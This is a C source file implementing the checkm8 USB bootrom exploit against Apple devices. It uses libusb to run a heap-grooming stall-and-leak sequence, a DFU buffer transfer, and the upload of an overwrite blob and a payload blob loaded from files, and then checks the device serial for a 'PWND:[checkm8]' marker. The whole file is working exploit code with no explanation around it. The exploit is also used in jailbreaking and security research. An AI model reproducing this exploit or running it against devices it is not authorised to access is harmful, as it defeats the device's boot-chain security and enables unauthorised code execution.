#include "checkm8.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#include "libusb_helpers.h"
#include "libusb.h"

typedef int(stage_function)(struct pwned_device *dev);

int complete_stage(struct pwned_device *device, stage_function *func)
{
    checkm8_debug_indent("complete_stage(dev = %p, func = %p)\n", device, func);
    int ret;

    ret = get_device_bundle(device);
    if(ret == LIBUSB_ERROR_NO_DEVICE || ret == LIBUSB_ERROR_ACCESS)
    {
        checkm8_debug_indent("\tfailed to get device bundle\n");
        return CHECKM8_FAIL_NODEV;
    }

    checkm8_debug_indent("\tgot device bundle, calling function\n");
    ret = func(device);

    checkm8_debug_indent("\treleasing device bundle\n");
    release_device_bundle(device);

    return ret;
}

int stage1_function(struct pwned_device *dev)
{
    checkm8_debug_indent("exploit stage 1\n");
    unsigned int i;

    stall(dev);
    for(i = 0; i < 5; i++)
    {
        no_leak(dev);
    }
    usb_req_leak(dev);
    no_leak(dev);

    checkm8_debug_indent("\treset\n");
    libusb_reset_device(dev->bundle->handle);
    return CHECKM8_SUCCESS;
}

int stage2_function(struct pwned_device *dev)
{
    checkm8_debug_indent("exploit stage 2\n");
    unsigned char databuf[0x800];
    memset(databuf, 'A', 0x800);

    libusb1_async_ctrl_transfer(dev, 0x21, 1, 0, 0, databuf, 0x800, 1);
    libusb1_no_error_ctrl_transfer(dev, 0x21, 4, 0, 0, NULL, 0, 0);

    checkm8_debug_indent("\treset\n");
    libusb_reset_device(dev->bundle->handle);
    return CHECKM8_SUCCESS;
}

int stage3_function(struct pwned_device *dev)
{
    checkm8_debug_indent("exploit stage 3\n");
    unsigned char overwrite_buf[1524];
    FILE *overwrite_file = fopen(CHECKM8_BIN_BASE "overwrite.bin", "r");
    fread(overwrite_buf, 1524, 1, overwrite_file);
    fclose(overwrite_file);

    unsigned char payload_buf[2400];
    FILE *payload_file = fopen(CHECKM8_BIN_BASE "payload.bin", "r");
    fread(payload_buf, 2400, 1, payload_file);
    fclose(payload_file);

    usb_req_stall(dev);
    usb_req_leak(dev);

    checkm8_debug_indent("\ttransferring overwrite\n");
    libusb1_no_error_ctrl_transfer(dev, 0, 0, 0, 0, overwrite_buf, 1524, 100);

    checkm8_debug_indent("\ttransferring payload\n");
    libusb1_no_error_ctrl_transfer(dev, 0x21, 1, 0, 0, payload_buf, 2048, 100);
    libusb1_no_error_ctrl_transfer(dev, 0x21, 1, 0, 0, &payload_buf[2048], 352, 100);

    checkm8_debug_indent("reset\n");
    libusb_reset_device(dev->bundle->handle);
    return CHECKM8_SUCCESS;
}

int check_function(struct pwned_device *dev)
{
    checkm8_debug_indent("checking device serial\n");
    unsigned char serial_buf[128];
    unsigned int i;
    struct libusb_device_handle *handle = dev->bundle->handle;
    struct libusb_device_descriptor *desc = dev->bundle->descriptor;

    libusb_get_string_descriptor_ascii(handle, desc->iSerialNumber, serial_buf, sizeof(serial_buf));
    checkm8_debug_indent("\tgot serial %s\n", serial_buf);

    for(i = 0; i < 13; i++)
    {
        if(serial_buf[99 + i] != "PWND:[checkm8]"[i])
        {
            return CHECKM8_FAIL_NOEXP;
        }
    }

    return CHECKM8_SUCCESS;
}

struct pwned_device *exploit_device()
{
    struct pwned_device *res = calloc(1, sizeof(struct pwned_device));
    res->status = DEV_NORMAL;
    res->bundle = calloc(1, sizeof(struct libusb_device_bundle));
    res->idVendor = DEV_IDVENDOR;
    res->idProduct = DEV_IDPRODUCT;

    checkm8_debug_indent("exploit_device() -> dev = %p\n", res);

    int ret = complete_stage(res, check_function);
    if(ret == CHECKM8_SUCCESS)
    {
        // already exploited
        res->status = DEV_PWNED;
        return res;
    }
    else if(ret == CHECKM8_FAIL_NODEV)
    {
        // no device found
        free(res);
        return NULL;
    }
    else
    {
        // normal device found - exploit
        ret = complete_stage(res, stage1_function);
        if(ret == CHECKM8_SUCCESS)
        {
            ret = complete_stage(res, stage2_function);
            usleep(500000);
        }

        if(ret == CHECKM8_SUCCESS)
        {
            ret = complete_stage(res, stage3_function);
            usleep(500000);
        }

        if(ret == CHECKM8_SUCCESS)
        {
            ret = complete_stage(res, check_function);
        }

        if(ret == CHECKM8_SUCCESS)
        {
            res->status = DEV_PWNED;
            return res;
        }
        else return NULL;
    }
}

void free_device(struct pwned_device *dev)
{
    release_device_bundle(dev);
    free(dev);
}